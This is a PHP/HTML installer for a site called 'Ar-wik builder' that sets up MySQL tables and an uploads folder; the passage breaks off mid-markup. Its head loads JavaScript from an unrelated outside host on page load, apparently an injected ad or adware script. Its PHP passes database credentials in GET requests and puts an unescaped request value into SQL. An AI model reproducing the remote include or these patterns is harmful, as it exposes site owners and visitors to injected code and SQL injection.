<?php
$dataBaseHost = "localhost";
$dataBaseName = "artest";
$dataBaseUser = "root";
$dataBasePassword = "";
$text = "";
$status = "";
$allTables = array();

header("Content-Type: text/html; charset=UTF-8");
if(isset($_GET["index"])){
	$dataBaseHost = $_GET["host"];
	$dataBaseName = $_GET["name"];
	$dataBaseUser = $_GET["user"];
	$dataBasePassword = $_GET["password"];
	DB::setParams($dataBaseHost,$dataBaseName,$dataBaseUser,$dataBasePassword);
	if($_GET["index"]==0){
		$sql = "ALTER DATABASE $dataBaseName CHARACTER SET utf8 COLLATE utf8_general_ci;";
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$sql2 = "SHOW TABLES;";
			$result2 = DB::query($sql2);
			if($result2===false){
				$status = "error";
				$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
			}else{
				$status = "ok";
				$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
				foreach($result2 as $value2)
					$allTables[] = $value2[0];
			}
		}
		
	}

	if($_GET["index"]==1){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `TypeOrder`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==2){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `TypeOrder`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==3){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `Order`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==4){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `Order`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Text` VARCHAR(70) NOT NULL,
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin',
	`Social` VARCHAR(255),
	`Phone` VARCHAR(55),
	`Created` TIMESTAMP NOT NULL,
	`TypeId` INT UNSIGNED NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==5){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `WinnersWeek`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==6){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `WinnersWeek`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	`Active` TINYINT UNSIGNED DEFAULT '1',
	`Created` TIMESTAMP NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==7){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `WinnersWeekOrder`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==8){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `WinnersWeekOrder`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`IdWinnersWeek` INT UNSIGNED NOT NULL,
	`IdOrder` INT UNSIGNED NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==9){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `Smartphones`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==10){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `Smartphones`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin' NOT NULL,
	`FirstPay` VARCHAR(255) NOT NULL,
	`UrlShop` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==11){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `Parameters`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==12){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `Parameters`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255),
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin' NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==13){
		$sql = <<<HERESTR

set foreign_key_checks=0;

DROP TABLE IF EXISTS `SmartphonesParameters`;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==14){
		$sql = <<<HERESTR

set foreign_key_checks=0;

CREATE TABLE `SmartphonesParameters`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`IdParameter` INT UNSIGNED NOT NULL,
	`IdSmartphone` INT UNSIGNED NOT NULL,
	`Text` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==15){
		$sql = <<<HERESTR

ALTER TABLE `Order`
	ADD CONSTRAINT `TypeOrder (Order)`
	FOREIGN KEY (`TypeId`)
	REFERENCES `TypeOrder` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==16){
		$sql = <<<HERESTR

ALTER TABLE `WinnersWeekOrder`
	ADD CONSTRAINT `Order (WinnersWeekOrder)`
	FOREIGN KEY (`IdOrder`)
	REFERENCES `Order` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
ALTER TABLE `WinnersWeekOrder`
	ADD CONSTRAINT `WinnersWeek (WinnersWeekOrder)`
	FOREIGN KEY (`IdWinnersWeek`)
	REFERENCES `WinnersWeek` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}

	if($_GET["index"]==17){
		$sql = <<<HERESTR

ALTER TABLE `SmartphonesParameters`
	ADD CONSTRAINT `Smartphones (SmartphonesParameters)`
	FOREIGN KEY (`IdSmartphone`)
	REFERENCES `Smartphones` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
ALTER TABLE `SmartphonesParameters`
	ADD CONSTRAINT `Parameters (SmartphonesParameters)`
	FOREIGN KEY (`IdParameter`)
	REFERENCES `Parameters` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
HERESTR;
		$result = DB::query($sql);
		if($result===false){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка! ".DB::$_status[1]." (".DB::$_status[0].")</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Запрос успешно выполнен.</div>";
		}
		
	}
	
	if($_GET["index"]==18){
		$foldersResult = DB::createDirForFiles();
		if(is_array($foldersResult)){
			$status = "error";
			$text = "<div style='color:#A80000'>Произошла ошибка при создании папки для загрузки файлов! ($foldersResult[0])</div>";
		}else{
			$status = "ok";
			$text = "<div style='color:#00A800'>Папка для загрузки файлов успешно создана.</div>";
		}
		
	}
	$return = array(
		"result"=>$status,
		"text"=>$text,
		"allt"=>$allTables
	);
	echo json_encode($return);
	exit;
}
?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Ar-wik builder установка.</title>
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://img.rafomedia.com/zr/js/adrns_y.js?20151117";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>

<script language="javascript" type="text/javascript">
var obj;
var index = 0;
var host = "";
var name = "";
var user = "";
var password = "";
var onWork = false;
var dropQueries = Array(
	1,
	3,
	5,
	7,
	9,
	11,
	13
);
var alterQueries = Array(
	Array(15," ALTER TABLE `Order`  ADD CONSTRAINT `TypeOrder (Order)`  FOREIGN KEY (`TypeId`)  REFERENCES `TypeOrder` (`id`)  ON DELETE CASCADE  ON UPDATE CASCADE;"),
	Array(16," ALTER TABLE `WinnersWeekOrder`  ADD CONSTRAINT `Order (WinnersWeekOrder)`  FOREIGN KEY (`IdOrder`)  REFERENCES `Order` (`id`)  ON DELETE CASCADE  ON UPDATE CASCADE; ALTER TABLE `WinnersWeekOrder`  ADD CONSTRAINT `WinnersWeek (WinnersWeekOrder)`  FOREIGN KEY (`IdWinnersWeek`)  REFERENCES `WinnersWeek` (`id`)  ON DELETE CASCADE  ON UPDATE CASCADE;"),
	Array(17," ALTER TABLE `SmartphonesParameters`  ADD CONSTRAINT `Smartphones (SmartphonesParameters)`  FOREIGN KEY (`IdSmartphone`)  REFERENCES `Smartphones` (`id`)  ON DELETE CASCADE  ON UPDATE CASCADE; ALTER TABLE `SmartphonesParameters`  ADD CONSTRAINT `Parameters (SmartphonesParameters)`  FOREIGN KEY (`IdParameter`)  REFERENCES `Parameters` (`id`)  ON DELETE CASCADE  ON UPDATE CASCADE;"));
var oldTables = Array();

function replaceHtml(el, html) {
	var oldEl = typeof el === "string" ? document.getElementById(el) : el;
	var newEl = oldEl.cloneNode(false);
	newEl.innerHTML = html;
	oldEl.parentNode.replaceChild(newEl, oldEl);
	return newEl;
};
function unlockForm(){
	document.getElementById("host").disabled = false;
	document.getElementById("name").disabled = false;
	document.getElementById("user").disabled = false;
	document.getElementById("password").disabled = false;
	document.getElementById("startButton").className = "button";
	document.getElementById("host").className = "inputData";
	document.getElementById("name").className = "inputData";
	document.getElementById("user").className = "inputData";
	document.getElementById("password").className = "inputData";
	onWork = false;
}
function start(type){
	if(onWork==true && type!="system")
		return false;
	if(type!="system"){
		index = 0;
		oldTables = Array();
		onWork = true;
		for(var i=0; i<=18; i++){
			document.getElementById("title_"+i).style.display = "none";
			document.getElementById("query_"+i).style.display = "none";
			document.getElementById("index_"+i).style.display = "none";
			if(i==18){
				replaceHtml(document.getElementById("title_"+i),"Создание папки для загрузки файлов...");
			}else{
				replaceHtml(document.getElementById("title_"+i),"Выполнение запроса...");
			}
		}
		document.getElementById("ErrorResult").style.display = "none";
		document.getElementById("OkResult").style.display = "none";
		document.getElementById("host").className = "inputDataLock";
		document.getElementById("name").className = "inputDataLock";
		document.getElementById("user").className = "inputDataLock";
		document.getElementById("password").className = "inputDataLock";
		document.getElementById("host").disabled = true;
		document.getElementById("name").disabled = true;
		document.getElementById("user").disabled = true;
		document.getElementById("password").disabled = true;
		document.getElementById("startButton").className = "buttonLock";
		host = document.getElementById("host").value;
		name = document.getElementById("name").value;
		user = document.getElementById("user").value;
		password = document.getElementById("password").value;
	}
	if(index>18){
		document.getElementById("OkResult").style.display = "block";
		unlockForm();
		return true;
	}
	if(document.getElementById("deleteTypeNo").checked==true){
		for(var i2=0; i2<dropQueries.length; i2++){
			if(dropQueries[i2]==index){
				index++;
				break;
			}
		}
		var newIndex = index;
		var checkIndex = false;
		while(checkIndex==false){
			var isAlterQuery = false;
			for(i2=0; i2<alterQueries.length; i2++){
				if(alterQueries[i2][0]==newIndex){
					for(var i3=0; i3<oldTables.length; i3++){
						if(alterQueries[i2][1].indexOf("ALTER TABLE `"+oldTables[i3]+"`")!=-1){
							isAlterQuery = true;
							newIndex++;
							break;
						}
					}
					break;
				}
			}
			if(isAlterQuery==false)
				checkIndex = true;
		}
		index = newIndex;
	}
	document.getElementById("title_"+index).style.display = "block";
	document.getElementById("query_"+index).style.display = "block";
	document.getElementById("index_"+index).style.display = "block";
	var r = new XMLHttpRequest(); 
	r.open("GET", "<?php echo "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; ?>?host="+host+"&name="+name+"&user="+user+"&password="+password+"&index="+index, true);
	r.onreadystatechange = function () {
		if (r.readyState != 4 || r.status != 200) return;
		var isResult = true;
		var parseError = false;
		try{
			obj = JSON.parse(r.responseText);
		}catch(e){
			isResult = false;
			parseError = true;
		}
		if(parseError==false)
			if(obj.result=="error")
				isResult = false;
		if(index==0 && obj.allt.length>0)
			oldTables = obj.allt;
		if(isResult==false){
			unlockForm();
			if(parseError==true){
				if(index!=18){
					replaceHtml(document.getElementById("title_"+index),"<div style='color:#A80000'>Произошла ошибка при выполнении запроса.</div>");
				}else{
					replaceHtml(document.getElementById("title_"+index),"<div style='color:#A80000'>Произошла ошибка при попытке создания папки.</div>");
				}
			}else{
				replaceHtml(document.getElementById("title_"+index),obj.text);
			}
			document.getElementById("ErrorResult").style.display = "block";
			return;
		}else{
			replaceHtml(document.getElementById("title_"+index),obj.text); 
			index++;
			start("system");
		}
	};
	r.send();
}
</script>

<style type="text/css">
#logoSmall{
	border:3px solid #488D9B;
	width:45px;
	height:45px;
	background:#6EC060;
	color:#FFF;
	font-weight:bold;
	text-align:center;
	-webkit-border-radius:121px;
	-moz-border-radius:121px;
	border-radius:121px;
	position:relative;
	-webkit-box-shadow: 0px 0px 15px 0px rgba(0,0,0,0.75);
	-moz-box-shadow: 0px 0px 15px 0px rgba(0,0,0,0.75);
	box-shadow: 0px 0px 15px 0px rgba(0,0,0,0.75);
	margin:0 auto 30px auto;
}
#logoSmall:Hover{
	-webkit-box-shadow: 0px 0px 7px 0px rgba(0,0,0,0.75);
	-moz-box-shadow: 0px 0px 7px 0px rgba(0,0,0,0.75);
	box-shadow: 0px 0px 7px 0px rgba(0,0,0,0.75);
}
#logoSmall div{
	font-size:120px;
	font-size:40px;
	position:relative;
	top:-5px;
}
@media screen and (-webkit-min-device-pixel-ratio:0) {
    #logoSmall div{ top:-5px; }
}
.inputTitle{
	font-size:14px;
	color:#333;
}
.inputData:Hover, .inputData:active, .inputData:focus{
	border-color:#6C9AD6;
}
.inputData{
	border:1px solid #888788;
	background:#FBFBFB;
	color:#4C4C4C;
	box-shadow:0px 1px 4px 0px rgba(168, 168, 168, 0.6) inset;
	-moz-box-shadow:0px 1px 4px 0px rgba(168, 168, 168, 0.6) inset;
	-webkit-box-shadow:0px 1px 4px 0px rgba(168, 168, 168, 0.6) inset;
	transition: all 0.2s linear;
	position:relative;
	width:100%;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	padding:12px 5px;
}
.inputDataLock{
	border:1px solid #D7D7D7;
	background:#F8F8F8;
	position:relative;
	width:100%;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	color:#CCC;	
	padding:12px 5px;
}
body{
	margin:0;
	padding:0;
	font-family:Verdana, Geneva, sans-serif;
	font-size:12px;
	color:#000;
	overflow-y:scroll;
}
textarea:focus, input:focus, select:focus{
	outline: none;
}
a, a:active, a:Hover{
	color:#FFF;
	text-decoration:none;
}
label{
	position:relative;
	top:-3px;
	cursor:pointer;
}
.inputError{
	font-size:11px;
	color:red;
	visibility:hidden;
	padding:2px;
	position:relative;
	left:4px;
	width:auto;
	top:-4px;
	-webkit-border-radius:7px;
	-moz-border-radius:7px;
	border-radius:7px;
}
.button, .buttonLock{
	text-align:center;
	cursor:pointer;
	background:#0B5182;
	color:#FFF;
	border:1px solid #145A8B;
	border-left-style:none;
	padding:15px;
	width:auto;
	min-width:150px;
	-moz-transition: background-color 0.1s linear;
	-o-transition: background-color 0.1s linear;
	-webkit-transition: background-color 0.1s linear;
}
.buttonLock{
	cursor:default;
	filter:progid:DXImageTransform.Microsoft.Alpha(opacity=40); /* IE 5.5+*/
	-moz-opacity: 0.4; /* Mozilla 1.6 и ниже */
	-khtml-opacity: 0.4; /* Konqueror 3.1, Safari 1.1 */
	opacity: 0.4; /* CSS3 - Mozilla 1.7b +, Firefox 0.9 +, Safari 1.2+, Opera 9+ */	
}
.button:Hover{
	background-color:#062439;
}
.selectRulesZoneTitle{
	text-align:center;
	font-size:16px;
	font-weight:bold;
	color:#03A9F9;
	padding:3px 0;
	position:relative;
	background:#FFF;
}
.selectNotAddClassesTitleDes{
	font-size:11px;
	font-weight:100;
	margin-top:4px;
}
.selectRulesHL{
	background:#FFF;
	position:relative;
	clear:both;
	border-top:1px dashed #03A9F9;
	height:1px;
	width:100%;
}
.selectRulesZoneTitleGradLeft{
	position:absolute;
	left:0;
	top:1px;
	height:100%;
	width:60px;
	/* IE9 SVG, needs conditional override of 'filter' to 'none' */
	background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmZmZmZmYiIHN0b3Atb3BhY2l0eT0iMCIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
	background: -moz-linear-gradient(left,  rgba(255,255,255,1) 0%, rgba(255,255,255,0) 100%); /* FF3.6+ */
	background: -webkit-gradient(linear, left top, right top, color-stop(0%,rgba(255,255,255,1)), color-stop(100%,rgba(255,255,255,0))); /* Chrome,Safari4+ */
	background: -webkit-linear-gradient(left,  rgba(255,255,255,1) 0%,rgba(255,255,255,0) 100%); /* Chrome10+,Safari5.1+ */
	background: -o-linear-gradient(left,  rgba(255,255,255,1) 0%,rgba(255,255,255,0) 100%); /* Opera 11.10+ */
	background: -ms-linear-gradient(left,  rgba(255,255,255,1) 0%,rgba(255,255,255,0) 100%); /* IE10+ */
	background: linear-gradient(to right,  rgba(255,255,255,1) 0%,rgba(255,255,255,0) 100%); /* W3C */
	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#00ffffff',GradientType=1 ); /* IE6-8 */
}
.selectRulesZoneTitleGradRight{
	position:absolute;
	left:100%;
	top:1px;
	margin-left:-60px;
	height:100%;
	width:60px;
	/* IE9 SVG, needs conditional override of 'filter' to 'none' */
	background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIwIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmZmZmZmYiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
	background: -moz-linear-gradient(left,  rgba(255,255,255,0) 0%, rgba(255,255,255,1) 100%); /* FF3.6+ */
	background: -webkit-gradient(linear, left top, right top, color-stop(0%,rgba(255,255,255,0)), color-stop(100%,rgba(255,255,255,1))); /* Chrome,Safari4+ */
	background: -webkit-linear-gradient(left,  rgba(255,255,255,0) 0%,rgba(255,255,255,1) 100%); /* Chrome10+,Safari5.1+ */
	background: -o-linear-gradient(left,  rgba(255,255,255,0) 0%,rgba(255,255,255,1) 100%); /* Opera 11.10+ */
	background: -ms-linear-gradient(left,  rgba(255,255,255,0) 0%,rgba(255,255,255,1) 100%); /* IE10+ */
	background: linear-gradient(to right,  rgba(255,255,255,0) 0%,rgba(255,255,255,1) 100%); /* W3C */
	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00ffffff', endColorstr='#ffffff',GradientType=1 ); /* IE6-8 */
}
#OkResult{
	color:#060;
	border-color:#C0FF9B;
	background:#FFF;
}
#ErrorResult{
	color:#FFF;
	border-color:#DEA8A8;
	background:#900;
	font-weight:bold;
}
.msg{
	display:none;
	margin-top:50px;
	position:absolute;
	left:510px;
	top:-25px;
	font-size:30px;
	width:150px;
	height:97px;
	border-width:18px;
	border-style:solid;
	-webkit-border-radius:93px;
	-moz-border-radius:93px;
	border-radius:93px;
	text-align:center;
	padding-top:53px;
	filter:progid:DXImageTransform.Microsoft.Alpha(opacity=80); /* IE 5.5+*/
	-moz-opacity: 0.8; /* Mozilla 1.6 и ниже */
	-khtml-opacity: 0.8; /* Konqueror 3.1, Safari 1.1 */
	opacity: 0.8; /* CSS3 - Mozilla 1.7b +, Firefox 0.9 +, Safari 1.2+, Opera 9+ */	
}
.hide, .hideDescription, .hideIndex{
	display:none;
	margin:1px;
}
.hideIndex{
	font-size:26px;
	font-weight:bold;
	position:relative;
	left:-105px;
	color:#B1B1B1;
	text-align:right;
	width:80px;
}
pre{
	position:relative;
	top:-30px;
	overflow:hidden;
}
/* logic zone start */
.logicZone{
	background:#00A9FA;
	/*border:1px dotted #999;*/
	padding:5px 15px 15px 15px;
	position:relative;
	-webkit-border-radius: 15px;
	-moz-border-radius: 15px;
	border-radius: 15px;
	color:#FFF;
	margin-bottom:19px;
}
.logicZone div{
	padding-top:8px;
}
.logicZone label{
	color:#FFF;
}
.logicZone .inputTitle{
	font-weight:bold;
	color:#FFF;
}
.logicZone div div .inputError{
	position:relative;
	top:-11px;
}
/* logic zone end */
</style>

<link rel="shortcut icon" href="http://ar-wik.com/templates/images/icon.ico" type="image/x-icon">

<body>
<div style="width:600px; margin:0 auto; padding:20px; position:relative">
	<div id="logoSmall"><a href="http://ar-wik.com" target="_blank"><div>A</div></a></div>
    <div class="selectRulesZoneTitle">
        <div>Установка</div>
        <div class="selectNotAddClassesTitleDes">(будут созданы все таблицы а также директория для хранения загруженных файлов)</div>
    </div>
    <div class="selectRulesHL">
		<div class="selectRulesZoneTitleGradLeft" style="top:-1px"></div>
		<div class="selectRulesZoneTitleGradRight" style="top:-1px"></div>
	</div>
    <div style="margin-top:25px">
        <div class="inputTitle">Хост базы данных</div>
        <div style="margin-right:12px"><input value="<?php echo $dataBaseHost; ?>" name="" type="text" class="inputData" id="host"><div class="inputError">none</div></div>
    </div>
    <div>
        <div class="inputTitle">Имя базы данных</div>
        <div style="margin-right:12px"><input value="<?php echo $dataBaseName; ?>" name="" type="text" class="inputData" id="name"><div class="inputError">none</div></div>
    </div>
    <div>
        <div class="inputTitle">Имя пользователя</div>
        <div style="margin-right:12px"><input value="<?php echo $dataBaseUser; ?>" name="" type="text" class="inputData" id="user"><div class="inputError">none</div></div>
    </div>
    <div>
        <div class="inputTitle">Пароль</div>
        <div style="margin-right:12px"><input value="<?php echo $dataBasePassword; ?>" name="" type="password" class="inputData" id="password"><div class="inputError">none</div></div>
    </div>
    <div class="logicZone">
		<div class="inputTitle">Удалять таблицы с идентичным именем</div>
		<div><input name="deleteType" type="radio" value="" checked="" id="deleteTypeNo"><label for="deleteTypeNo">нет</label></div>
		<div><input name="deleteType" type="radio" value="" id="deleteTypeYes"><label for="deleteTypeYes">да</label></div>
	</div>    
    <div id="startButton" class="button" style="margin:10px auto 20px auto; width:150px" onClick="start()">Выполнить установку</div>
    <div id="OkResult" class="msg">успешно</div>
    <div id="ErrorResult" class="msg">ошибка</div>
    <div id="results">

		<div id="title_18" class="hide" style="font-weight:bold">Создание папки для загрузки файлов...</div>
		<div id="index_18" class="hideIndex">19</div>
		<div id="query_18" class="hide">
			<pre>

uploads
			</pre>
		</div>

		<div id="title_17" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_17" class="hideIndex">18</div>
		<div id="query_17" class="hide">
			<pre>

ALTER TABLE `SmartphonesParameters`
	ADD CONSTRAINT `Smartphones (SmartphonesParameters)`
	FOREIGN KEY (`IdSmartphone`)
	REFERENCES `Smartphones` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
ALTER TABLE `SmartphonesParameters`
	ADD CONSTRAINT `Parameters (SmartphonesParameters)`
	FOREIGN KEY (`IdParameter`)
	REFERENCES `Parameters` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
			</pre>
		</div>

		<div id="title_16" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_16" class="hideIndex">17</div>
		<div id="query_16" class="hide">
			<pre>

ALTER TABLE `WinnersWeekOrder`
	ADD CONSTRAINT `Order (WinnersWeekOrder)`
	FOREIGN KEY (`IdOrder`)
	REFERENCES `Order` (`id`)
